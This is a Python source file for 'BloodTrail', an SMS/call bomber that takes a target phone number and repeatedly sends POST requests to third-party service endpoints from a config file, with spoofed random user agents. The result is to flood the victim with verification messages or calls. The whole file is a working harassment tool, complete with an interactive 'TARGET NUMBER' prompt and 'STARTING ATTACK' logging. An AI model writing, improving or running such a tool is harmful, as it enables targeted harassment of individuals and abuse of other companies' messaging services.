import re
import asyncio
import aiohttp
import json
from fake_useragent import UserAgent
from datetime import datetime
from typing import Optional, Dict, Callable, Union

__version__ = "1.5.1"


class BomberStatus:

    def __init__(self, callback: Optional[Callable] = None):
        self.total_services = 0
        self.completed_runs = 0
        self.total_requests = 0
        self.start_time = None
        self.running = False
        self.status_messages = []
        self.callback = callback

    def log(self, message: str):
        self.status_messages.append(message)
        if self.callback:
            asyncio.create_task(self.callback(message))
        print(f"{' ' : >20}{message}")

    def get_report(self) -> str:
        if not self.start_time:
            return "Operation has not started yet."

        elapsed = (datetime.now() - self.start_time).total_seconds()
        report = [
            "===== BOMBING OPERATION REPORT =====",
            f"Total services: {self.total_services}",
            f"Total requests: {self.total_requests}",
            f"Completed runs: {self.completed_runs}",
            f"Duration: {elapsed:.1f}s",
            "====================================="
        ]
        return "\n".join(report)


def format_phone(raw_number: str, phone_pattern: str) -> str:
    digits = re.sub(r"\D", "", raw_number)
    if len(digits) < 11:
        raise ValueError(f"Wrong phone number format.")
    formatted = phone_pattern
    for digit in digits:
        formatted = formatted.replace('X', digit, 1)
    return formatted


class Service:
    def __init__(self, service_name: str, url: str, data: Dict, phone: str, timeout: int, status: BomberStatus):
        self.service_name = service_name
        self.url = url
        self.data = data
        self.phone = phone
        self.timeout = timeout
        self.next_run_time = 0
        self.runs_completed = 0
        self.ua = UserAgent()
        self.status = status

    async def request(self):
        headers = {"User-Agent": self.ua.random}
        self.status.log(f"STARTING REQUEST: '{self.service_name}' - ATTEMPT #{self.runs_completed}")

        try:
            async with aiohttp.ClientSession() as session:
                start_time = datetime.now()
                async with session.post(
                        self.url,
                        json=self.data,
                        headers=headers,
                        timeout=10
                ) as response:
                    result = response.status
                    duration = (datetime.now() - start_time).total_seconds()
                    self.status.log(f"SERVICE: '{self.service_name}' - STATUS: {result} - TOOK: {duration:.2f}s")
                    return result
        except aiohttp.ClientError as e:
            self.status.log(f"SERVICE: '{self.service_name}' - ERROR: Connection failed - {str(e)[:50]}")
            return None
        except asyncio.TimeoutError:
            self.status.log(f"SERVICE: '{self.service_name}' - ERROR: Request timeout")
            return None
        except Exception as e:
            self.status.log(f"SERVICE: '{self.service_name}' - ERROR: {str(e)[:50]}")
            return None

    def should_run(self, current_time: int) -> bool:
        return current_time >= self.next_run_time

    def update_next_run_time(self, current_time: int):
        self.next_run_time = current_time + self.timeout
        self.runs_completed += 1
        self.status.completed_runs += 1
        self.status.log(
            f"SERVICE: '{self.service_name}' - NEXT RUN IN {self.timeout}s - COMPLETED RUNS: {self.runs_completed}")


class ServiceManager:
    def __init__(self, status: BomberStatus):
        self.services = []
        self.start_time = None
        self.max_runs = 0
        self.running = False
        self.status = status

    def import_services(self, service_dict: Dict, phone: str):
        def apply_phone_pattern(raw_phone: str, pattern: str) -> str:
            digits = ''.join(filter(str.isdigit, raw_phone))
            result = []
            for ch in pattern:
                if 'A' <= ch <= 'K':  # placeholder
                    idx = ord(ch) - ord('A')
                    result.append(digits[idx] if idx < len(digits) else '')
                else:
                    result.append(ch)
            return ''.join(result)

        for service_name, service_data in service_dict.items():
            try:
                fmt_phone = apply_phone_pattern(phone, service_data.get("phone_pattern", ""))

                raw_url = service_data.get("url", "")
                if isinstance(raw_url, str) and "%PHONE%" in raw_url:
                    formatted_url = raw_url.replace("%PHONE%", fmt_phone)
                else:
                    formatted_url = raw_url

                data_copy = {}
                for key, value in service_data.get("data", {}).items():
                    if isinstance(value, str) and "%PHONE%" in value:
                        data_copy[key] = value.replace("%PHONE%", fmt_phone)
                    else:
                        data_copy[key] = value

                service = Service(
                    service_name=service_name,
                    url=formatted_url,
                    data=data_copy,
                    phone=fmt_phone,
                    timeout=service_data.get("timeout", 0),
                    status=self.status
                )
                self.services.append(service)
                self.status.log(f"LOADED SERVICE: '{service_name}' - TIMEOUT: {service_data.get('timeout')}s")
            except Exception as e:
                self.status.log(f"FAILED TO LOAD SERVICE: '{service_name}' - ERROR: {str(e)[:50]}")

    async def run_service(self, service: Service):
        await service.request()

    async def start(self, max_runs: int):
        global start_time
        if not self.services:
            self.status.log("NO SERVICES LOADED")
            return

        self.status.total_services = len(self.services)
        self.status.log(f"STARTING SERVICES - TOTAL: {len(self.services)} - MAX RUNS: {max_runs}")

        self.running = True
        self.status.running = True
        self.start_time = 0
        self.status.start_time = datetime.now()
        self.max_runs = max_runs if max_runs is not None else float('inf')

        try:
            total_requests = 0
            start_time = datetime.now()

            while self.running:
                current_time = self.start_time

                if all(service.runs_completed >= self.max_runs for service in self.services) and self.max_runs != float('inf'):
                    self.status.log(f"ALL SERVICES COMPLETED {self.max_runs} RUNS EACH")
                    break

                tasks = []
                for service in self.services:
                    if service.should_run(current_time) and service.runs_completed < self.max_runs:
                        tasks.append(asyncio.create_task(self.run_service(service)))
                        service.update_next_run_time(current_time)
                        self.status.total_requests += 1

                if tasks:
                    await asyncio.gather(*tasks)

                self.start_time += 1
                await asyncio.sleep(1)

        except asyncio.CancelledError:
            self.status.log("OPERATION CANCELLED")
        except Exception as e:
            self.status.log(f"ERROR IN SERVICE MANAGER: {str(e)}")
        finally:
            elapsed = (datetime.now() - start_time).total_seconds()
            completed = sum(service.runs_completed for service in self.services)

            self.status.log(f"OPERATION COMPLETE - DURATION: {elapsed:.1f}s")
            self.status.log(f"TOTAL REQUESTS: {self.status.total_requests} - COMPLETED RUNS: {completed}")
            self.running = False
            self.status.running = False

    def stop(self):
        if self.running:
            self.status.log("STOPPING SERVICES...")
            self.running = False


class BloodTrail:
    _instance = None

    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super(BloodTrail, cls).__new__(cls)
            cls._instance._initialized = False
        return cls._instance

    def __init__(self, config_path="data.json", status_callback: Optional[Callable] = None):
        if getattr(self, "_initialized", False):
            return

        self.config_path = config_path
        self.status = BomberStatus(callback=status_callback)
        self.service_manager = ServiceManager(self.status)
        self.data = None
        self._initialized = True

    async def load_config(self):
        try:
            self.status.log(f"LOADING CONFIG: {self.config_path}")
            with open(self.config_path, "r", encoding="utf-8") as f:
                self.data = json.load(f)

            self.status.log(f"CONFIG LOADED: {len(self.data['services'])} services found")
            return True
        except FileNotFoundError:
            self.status.log(f"CONFIG ERROR: File {self.config_path} not found")
            return False
        except json.JSONDecodeError:
            self.status.log(f"CONFIG ERROR: Invalid JSON in {self.config_path}")
            return False
        except Exception as e:
            self.status.log(f"CONFIG ERROR: {str(e)}")
            return False

    async def start(self, phone: str, runs: Union[int, str]):
        if isinstance(runs, str):
            try:
                runs = int(runs)
            except ValueError:
                runs = 1

        self.status.log(f"INITIALIZING BLOODTRAIL FOR: {phone} - REPETITIONS: {runs}")

        if not self.data and not await self.load_config():
            self.status.log(f"FAILED TO INITIALIZE: Config not loaded")
            return False

        if not phone:
            self.status.log(f"FAILED TO INITIALIZE: No phone number provided")
            return False

        self.status.log(f"IMPORTING SERVICES FOR TARGET: {phone}")
        self.service_manager.import_services(self.data["services"], phone)

        self.status.log(f"STARTING ATTACK")
        await self.service_manager.start(runs)
        self.status.log(f"ATTACK COMPLETED")
        return True

    def stop(self):
        self.service_manager.stop()

    def get_report(self) -> str:
        return self.status.get_report()


async def main():
    print(f"{' ' : >20}===== BLOODTRAIL v{__version__} =====")
    bloodtrail = BloodTrail()
    if not await bloodtrail.load_config():
        return

    phone = input(f"{' ' : >20}TARGET NUMBER (+7XXXXXXXXX): ")
    runs = int(input(f"{' ' : >20}REPETITIONS per service: "))

    print(f"{' ' : >20}===== STARTING ATTACK =====")
    await bloodtrail.start(phone, runs)
    print(f"{' ' : >20}===== ATTACK COMPLETED =====")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"{' ' : >20}===== OPERATION TERMINATED =====")